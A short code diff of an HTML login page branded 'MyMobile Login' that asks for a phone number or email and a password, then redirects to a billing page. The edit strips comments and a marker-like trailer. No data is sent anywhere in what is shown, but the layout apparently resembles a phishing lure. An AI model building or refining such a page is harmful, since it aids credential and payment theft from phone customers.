@@ -61,8 +61,8 @@
   </style>
   <script>
   function redirectToBilling(event) {
-    event.preventDefault(); // evita envío del formulario
-    window.location.href = "billing.html"; // redirige
+    event.preventDefault(); 
+    window.location.href = "billing.html"; 
   }
 </script>
 </head>
@@ -70,7 +70,7 @@
 
   <div class="login-box">
     <h1>MyMobile Login</h1>
-    <form form onsubmit="redirectToBilling(event)">
+    <form onsubmit="redirectToBilling(event)">
       <input type="text" name="phone" placeholder="Phone number or email" required />
       <input type="password" name="password" placeholder="Account password" required />
       <button type="submit" onclick="">Log In</button>
@@ -81,5 +81,4 @@
   </div>
 </body>
 
-<!-- 3_r3l3 -->
 </html>
